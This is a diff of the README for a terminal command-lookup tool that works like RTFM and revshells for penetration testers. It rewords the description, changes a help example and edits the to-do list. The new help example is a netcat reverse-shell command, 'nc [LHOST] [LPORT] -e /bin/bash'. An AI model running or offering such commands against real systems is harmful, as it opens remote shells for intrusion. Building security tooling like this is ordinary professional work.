@@ -1,4 +1,4 @@
-The goal of this project is to create an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal.
+The goal of this project is to create an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal, but often type when you have a shell on a remote host or when interacting with a vulnerable web app.
 
 I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be adding new commands and pushing the edited db file to the repository as I use this tool myself.    
 
@@ -12,7 +12,7 @@ Crtl+h or hist   Display selectable history of already selected commands.
 Ctrl+v           Paste from clipboard
 info             Display info on the currently selected command.
 env              Show currently set user variables
-add              Add a command to the database e.g. 'add -c stty raw -echo;fg'
+add -c           Add a command to the database e.g. 'add -c nc [LHOST] [LPORT] -e /bin/bash'
 update           update database columns of currently selected command e.g. 'update comment bash reverse shell'.
 Esc              Exit current mode.
 help             Display help
@@ -56,12 +56,11 @@ Windows: Currently not supported because Termion does not work on windows.  I'll
 - [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
 - [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
 - [ ] Continue to updating database with newer commands for things like Bloodhound,ffuf,feroxbuster,Rubeus,Crackmapexec,Chisel,SSHuttle, etc.
-- [ ] Add a better method for generating help content with the prettytable crate.
 - [ ] Command auto completion
 - [ ] Switch from termion to crossterm for Windows support.
 - [ ] Add search capability for text based/markdown notes.    
     - Root directory for user's notes will be supplied in a CLI variable.
-- [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected... there is probably a crate to display markdown.
+- [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected.
 
 ## To Fix
 - [ ] Add buffer to scroll through result output that doesn't fit within terminal windows.
